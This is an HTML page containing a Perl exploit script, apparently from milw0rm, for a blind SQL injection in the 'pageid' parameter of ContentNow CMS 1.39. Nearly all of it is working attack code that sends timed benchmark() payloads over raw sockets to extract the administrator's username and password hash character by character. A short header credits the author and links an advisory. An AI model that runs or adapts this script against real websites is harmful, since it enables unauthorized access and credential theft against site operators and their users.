<html><head><title>ContentNow 1.39 (pageid) Remote SQL Injection Exploit</title></head><pre>#!/usr/bin/perl -w

use IO::Socket;
use strict;

#   ContentNow &quot;pageid&quot; Sql Injection
# Version  : 1.39
#     Url  : http://www.contentnow.mf4k.de
# Author   : Alfredo 'revenge' Pesoli
# Advisory : http://www.0xcafebabe.it/advisory/contentnow_139_sqlinjection.txt 
#
# Description:
#
# The &quot;pageid&quot; parameter isn't properly sanitised before being returned in sql query
# and can be used to inject craft SQL queries, we can use Blind SQL Injection attack
# to disclose admin credential.
#
# Works regardless of magic quotes
# 
# http://www.0xcafebabe.it
# &lt;revenge@0xcafebabe.it&gt;

if (@ARGV &lt; 2) { &amp;usage; }

my $delay	= &quot;1500000&quot;;
my $host        = $ARGV[0];
my $dir         = $ARGV[1];
if ($ARGV[2] ) { $delay = $ARGV[2]; }

print &quot;\nTarget url : &quot;.$host.$dir.&quot;\n\n&quot;;
$host =~ s/(http:\/\/)//;

my @array = (&quot;user&quot;,&quot;password&quot;);

print &quot;--== Trying to perform sql injection ==--\n\n&quot;;
sleep(1);

&amp;sploit();

sub sploit() {
	my $x 		= &quot;&quot;;
	my $i		= &quot;&quot;;
	my $string	= &quot;&quot;;
	my $res		= &quot;1&quot;;
	
	for ( $x=0; $x&lt;=$#array; $x++ ) {
		my $j = 1;
		$res  = 1;
		while ($res) {
			for ($i=32;$i&lt;=127;$i++) {
				$res = 0;
				
				if ( $x eq 1 ) {
					next if ( $i &lt; 48 );
					next if ( ( $i &gt; 57 ) and ( $i &lt; 97 ) );
					next if ( $i &gt; 102 );
				}

				my $val  = &quot;index.php?&quot;;

				$val .= &quot;pageid=(select(if((ascii(substring($array[$x],$j,1))=$i),benchmark(&quot;.$delay.&quot;,sha1(13)),0))/**/from/**/cn_sessions/**/where/**/id=1/**/limit/**/1)&quot;;
				my $data=$dir.$val;
				my $start = time();
	
				my $req = IO::Socket::INET-&gt;new( Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; &quot;$host&quot;, PeerPort =&gt; &quot;80&quot;) || die &quot;Error - connection failed\n\n&quot;;
				print $req &quot;GET $data HTTP/1.1\r\n&quot;;
				print $req &quot;Host: $host\r\n&quot;;
				print $req &quot;User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.6) Gecko/20060728 Firefox/1.5.0.6 (GNU Linux)\r\n&quot;;
				print $req &quot;Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\r\n&quot;;
				print $req &quot;Accept-Language: en-us;q=0.7,en;q=0.3\r\n&quot;;
				print $req &quot;Accept-Encoding: gzip,deflate\r\n&quot;;
				print $req &quot;Keep-Alive: 300\r\n&quot;;
				print $req &quot;Connection: Keep-Alive\r\n&quot;;
				print $req &quot;Cache-Control: no-cache\r\n&quot;;
				print $req &quot;Connection: close\r\n\r\n&quot;;
				
				while (my $result = &lt;$req&gt;) {
					if ( $result =~ /404 Not Found/ ) {
						printf &quot;\n\nFile not found.\n\n&quot;;
						print &quot;\n\n$result\n\n&quot;;
						exit;
					}
					if ( $result =~ /400 Bad Request/ ) {
						printf &quot;\n\nBad request.\n\n&quot;;
						print &quot;\n\n$result\n\n&quot;;
						exit;
					}
				}
				my $end = time();
				my $dft = $end - $start;
				
				if ( $dft &gt; 4 ) {
					$string .= chr($i);
					print &quot;\n\tFound : &quot;.chr($i).&quot;\n\n&quot;;
					$res = 1;
					last;
				}
				print &quot;\tTrying : &quot;.chr($i).&quot;\n&quot;;
			}
			$j++;
			if ( !$res ) {
				$array[$x] = $string;
				$string = &quot;&quot;;
			}
		}
	}
	print &quot;\n----------------------\n&quot;;
	print &quot;Admin username : $array[0]\n&quot;;
	print &quot;Admin password : $array[1]\n\n&quot;;
}

sub usage() {
    print &quot;\n ContentNow CMS 1.39 'pageid' SQL Injection Exploit (Admin credentials disclosure)\n&quot;;
    print &quot; &lt;revenge\@0xcafebabe.it&gt;\n&quot;;
    print &quot; http://www.0xcafebabe.it\n\n&quot;;
    print &quot;Usage: $0 &lt;target&gt; &lt;directory&gt; [benchmark_delay]\n&quot;;
    print &quot;Example: $0 127.0.0.1 /contentnow/ 2000000\n\n&quot;;
    exit();
}

# milw0rm.com [2006-11-21]</pre></html>